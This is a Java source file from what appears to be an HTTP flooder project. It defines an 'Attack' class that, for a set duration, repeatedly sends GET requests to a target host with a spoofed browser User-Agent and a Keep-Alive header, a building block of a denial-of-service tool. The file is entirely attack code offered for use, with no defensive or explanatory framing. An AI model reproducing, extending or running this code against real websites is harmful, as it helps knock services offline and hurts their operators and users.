package me.aaronakhtar.http_flooder;

import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;

public class Attack implements Runnable {

    private int time;
    private String host;

    public Attack(int time, String host) {
        this.time = time * 1000;
        this.host = host;
    }

    @Override
    public void run() {
        long s = System.currentTimeMillis() + time;
        while(System.currentTimeMillis() < s){
            try{
                URL url = new URL(host);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.addRequestProperty("Keep-Alive", "10");
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(5000);
                connection.addRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0");
                connection.getResponseCode();
                Thread.sleep(50);
               // connection.disconnect();
            }catch (Exception e){
                System.out.println("Err: " + e.getMessage());
            }
        }
    }
}
